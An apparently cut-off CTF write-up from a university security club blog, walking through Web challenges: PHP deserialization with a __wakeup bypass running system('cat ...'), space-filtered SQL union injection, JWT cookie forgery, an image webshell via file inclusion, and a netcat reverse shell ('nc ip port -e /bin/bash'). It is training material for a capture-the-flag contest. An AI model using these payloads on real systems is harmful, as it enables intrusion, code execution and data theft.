@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-undefined.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wiki.w-ais.cn","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="WUST第二次内部赛 Writeup（儿童节快乐）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WUST内部赛（儿童节）wp">
+<meta property="og:url" content="https://wiki.w-ais.cn/2020/06/01/s1rtwo_tp/index.html">
+<meta property="og:site_name" content="WUST-AIS">
+<meta property="og:description" content="WUST第二次内部赛 Writeup（儿童节快乐）">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3S4JS.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3SqZq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3SvJU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3p9y9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pie1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pFdx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pko6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pEFK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pVJO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3psYT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3p0wq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/31/t3pXnA.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200601010515.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200601011824.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004446.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153521.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004417.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153541.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153553.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153648.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153827.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153806.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154141.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133324.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133343.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200531133952.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200529234531.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154351.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154417.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200529235205.png">
+<meta property="og:image" content="https://gitee.com/ivenwings/md_img/raw/master/img/20200526154632.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8saZV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sdaT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sDG4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sHsI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sBiF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8swIU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8s5Je.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sIRH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sozd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8s7QA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8srRJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8ssz9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8s6MR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sWdK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sfIO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8scs1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sgqx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/06/01/t8sRZ6.png">
+<meta property="article:published_time" content="2020-05-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-06-01T05:27:01.258Z">
+<meta property="article:author" content="WUST-AIS">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/05/31/t3S4JS.png">
+
+<link rel="canonical" href="https://wiki.w-ais.cn/2020/06/01/s1rtwo_tp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>WUST内部赛（儿童节）wp | WUST-AIS</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WUST-AIS</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wiki.w-ais.cn/2020/06/01/s1rtwo_tp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/logo.png">
+      <meta itemprop="name" content="WUST-AIS">
+      <meta itemprop="description" content="Join us">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WUST-AIS">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WUST内部赛（儿童节）wp
+        </h1>
+
+        <div class="post-meta">
+           
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-06-01 00:00:00 / Modified: 13:27:01" itemprop="dateCreated datePublished" datetime="2020-06-01T00:00:00+08:00">2020-06-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>WUST第二次内部赛 Writeup（儿童节快乐）</p>
+<a id="more"></a>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>访问页面：</p>
+<p><img src="https://s1.ax1x.com/2020/05/31/t3S4JS.png" alt="t3S4JS.png"></p>
+<p>猜密码，第一反应就是爆破，查看一下Hint</p>
+<p><img src="https://s1.ax1x.com/2020/05/31/t3SqZq.png" alt="t3SqZq.png"></p>
+<p>4位纯数字，开不开心，高不高兴，直接爆破（手动输入也行，我没意见）</p>
+<p><img src="https://s1.ax1x.com/2020/05/31/t3SvJU.png" alt="t3SvJU.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/31/t3p9y9.png" alt="t3p9y9.png"></p>
+<p>1314，输入进去，拿到flag</p>
+<p><img src="https://s1.ax1x.com/2020/05/31/t3pie1.png" alt="t3pie1.png"></p>
+<h3 id="我已备份好文件"><a href="#我已备份好文件" class="headerlink" title="我已备份好文件"></a>我已备份好文件</h3><blockquote>
+<p>根据上次的反馈，因此特地加了这道送分题。</p>
+</blockquote>
+<p>题目说备份文件，发现是php，那就尝试常见的源码泄露的点，可以参考协会 <code>wiki</code> 另一篇文章的点：<code>https://wiki.w-ais.cn/2019/07/14/Web-In-CTF/#备份文件源码泄漏</code></p>
+<p>访问 <code>index.php.bak</code> 拿到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">./flag.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaveFun</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Enjoy;</span><br><span class="line">	<span class="keyword">public</span> $Happy;</span><br><span class="line">	<span class="keyword">public</span> $keyboard;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($value1,$value2)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;Enjoy = $value1;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;Happy = $value2;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; <span class="comment">#</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>, <span class="keyword">$this</span>-&gt;keyboard))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;keyboard = <span class="string">""</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment">//echo $this-&gt;keyboard;</span></span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;keyboard);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'happy'</span>]))&#123;</span><br><span class="line">	unserialize($_POST[<span class="string">'happy'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个简单的反序列化，绕过 <code>__wakeup()</code> 就好了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaveFun</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Enjoy;</span><br><span class="line">	<span class="keyword">public</span> $Happy;</span><br><span class="line">	<span class="keyword">public</span> $keyboard;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>, <span class="keyword">$this</span>-&gt;keyboard))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;keyboard = <span class="string">""</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment">//echo $this-&gt;keyboard;</span></span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;keyboard);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> HaveFun();</span><br><span class="line">$a-&gt;keyboard = <span class="string">"system('cat ./flag.php');"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:7:"HaveFun":3:&#123;s:5:"Enjoy";N;s:5:"Happy";N;s:8:"keyboard";s:25:"system('cat ./flag.php');";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞原理：当反序列化字符串中，表示属性个数的值大于其真实值(这里&gt;3)，则跳过 <code>__wakeup()</code> 执行。</p>
+<p><code>O:7:&quot;HaveFun&quot;:4:{s:5:&quot;Enjoy&quot;;N;s:5:&quot;Happy&quot;;N;s:8:&quot;keyboard&quot;;s:25:&quot;system(&#39;cat ./flag.php&#39;);&quot;;}</code></p>
+<p>漏洞影响版本：</p>
+<p>PHP5 &lt; 5.6.25</p>
+<p>PHP7 &lt; 7.0.10</p>
+<p>传参，拿到flag</p>
+<p><img src="https://s1.ax1x.com/2020/05/31/t3pFdx.png" alt="t3pFdx.png"></p>
+<p>参考链接：</p>
+<p><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a></p>
+<p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mrsm1th/p/6835592.html</a></p>
+<h3 id="有点像甜饼"><a href="#有点像甜饼" class="headerlink" title="有点像甜饼"></a>有点像甜饼</h3><p><img src="https://s1.ax1x.com/2020/05/31/t3pko6.png" alt="t3pko6.png"></p>
+<p>一个登录界面，随便输入一些东西，会发现页面没什么变化，看一下Hint</p>
+<p>提示说admin：那就admin进去</p>
+<p><img src="https://s1.ax1x.com/2020/05/31/t3pEFK.png" alt="t3pEFK.png"></p>
+<p>返回这样，密码改为2，会发现有一点不同的回显；</p>
+<p>看看cookie：</p>
+<p><img src="https://s1.ax1x.com/2020/05/31/t3pVJO.png" alt="t3pVJO.png"></p>
+<p>这一看就是JWT，不用想了，找key</p>
+<p>登录框能有什么漏洞，测试一下sql注入，发现密码框存在注入点；</p>
+<p>fuzz一下，过滤了空格，引号（盲猜数字型输入，因为过滤了引号嘛）</p>
+<p>常规的union注入即可，将空格换成/**/即可绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;passwd&#x3D;1&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(hint_key)&#x2F;**&#x2F;from&#x2F;**&#x2F;hint)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/05/31/t3psYT.png" alt="t3psYT.png"></p>
+<p>拿到密钥去 <code>https://jwt.io/</code> 进行更改，然后 cookie 伪造一下，拿到 flag：</p>
+<p><img src="https://s1.ax1x.com/2020/05/31/t3p0wq.png" alt="t3p0wq.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJwZXJtaXNzaW9uIjoidHJ1ZSJ9.Ze4cQbeD2BMP9S5CmidQ6UrszaRBlm7aaR7opHh_nzk</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/05/31/t3pXnA.png" alt="t3pXnA.png"></p>
+<p>另外这题还有一个非预期解，由于出题人的疏忽，题目环境自带的 <code>phpmyadmin</code> 并没有处理掉，直接进入 <code>phpmyadmin</code> 用初始密码登陆就能直接看数据库了。</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601010515.png" alt="image-20200601010515131"></p>
+<p>参考链接：</p>
+<p><a href="https://www.freebuf.com/column/170359.html" target="_blank" rel="noopener">https://www.freebuf.com/column/170359.html</a></p>
+<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><blockquote>
+<p>Author: 这道题目出着是想理解一下渗透的流程，算比较用心地去出题，比较遗憾，因为严格意义上来说没有人解出来，准备了很多 <code>hint</code>，但感觉前面没做到，后面的提示好像也派不上用场，灵感来自空指针的一次内部赛，那个比较难。这次主要考点还是在文件上传(内部训练)，后面的渗透比较刻意地去设置，也不算太难，过了文件上传有 <code>hint</code> 都可以秒解，题目比较贴心地给你准备好了一切，都是基本操作，主要是想熟悉 <code>nmap</code> 的基本使用及内网探测与爆破。</p>
+</blockquote>
+<p>打开网页，一个文件上传，上传图片，会将图片显示出来，然后出现了两个不知道为什么会存在的东西：两首歌的歌词，注意到 <code>url</code> 发现有文件包含，<code>http://47.110.130.169:10001/view.php?article=song.php</code>，可以利用它来包含文件🐎，但同时也可以用伪协议读源码(这里没有过滤)，提示 <code>flag</code> 在 <code>/flag</code>，如果真的在，那么伪协议就能读 <code>flag</code> 了，这题就不用做了。</p>
+<p><code>http://47.110.130.169:10001/view.php?article=php://filter/convert.Base64-encode/resource=index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Can you bypass?&lt;/title&gt;</span><br><span class="line">I have already give you shell, this challenge is too easy.</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=<span class="string">"/index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"upload_file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">        $image_type = exif_imagetype($filename);</span><br><span class="line">        <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">            <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (isImage($temp_file)) &#123;</span><br><span class="line">            $name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">            $ext = substr(strrchr($name, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htaccess/i"</span>, $ext)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"illegal suffix!"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">                $fn = md5(time());</span><br><span class="line">                $dir = <span class="string">'uploads/'</span>.md5($ip);</span><br><span class="line">                <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">                    mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $img_path = $dir.<span class="string">'/'</span>.$fn.<span class="string">'.'</span>.$ext;</span><br><span class="line">                <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                    $is_upload = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'上传出错！'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" alt="Image"/&gt;'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'not image!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">"/view.php?article=wind.php"</span>&gt;夏天的风&lt;/a&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;a href=<span class="string">"/view.php?article=song.php"</span>&gt;歌·颂&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ban 了 <code>htaccess</code> 和 <code>ph</code> 后缀的所有文件，并且用 <code>exif_imagetype</code> 检测是否是图片，看样子只能上传图片。写入 <code>phpinfo()</code> 利用文件包含发现可以执行</p>
+<p><code>http://47.110.130.169:10001/view.php?article=图片路径</code></p>
+<p>可以直接在图片末尾写个马，也可以利用命令制作图片马：<code>copy shell.jpg /b + shell.php /a realshell.jpg</code></p>
+<p>这些在之前的直播培训中都有说到，接下来使用蚁剑连接或者反弹shell都可以</p>
+<p>蚁剑方法：</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601011824.png" alt="image-20200601011824402"></p>
+<p>在根目录找不到 <code>flag</code>，但是发现有一个 <code>hint.txt</code></p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200601004446.png" alt="image-20200601004446767"></p>
+<p>预期解是反弹shell，监听 <code>nc -lvp port</code>，写入马 <code>&lt;?php exec(&quot;nc ip port -e /bin/bash&quot;); ?&gt;</code> ，包含了之后可以发现弹到了shell。</p>
+<p><img src="https://gitee.com/ivenwings/md_img/raw/master/img/20200526153521.png" alt="image-20200526153521836"></p>
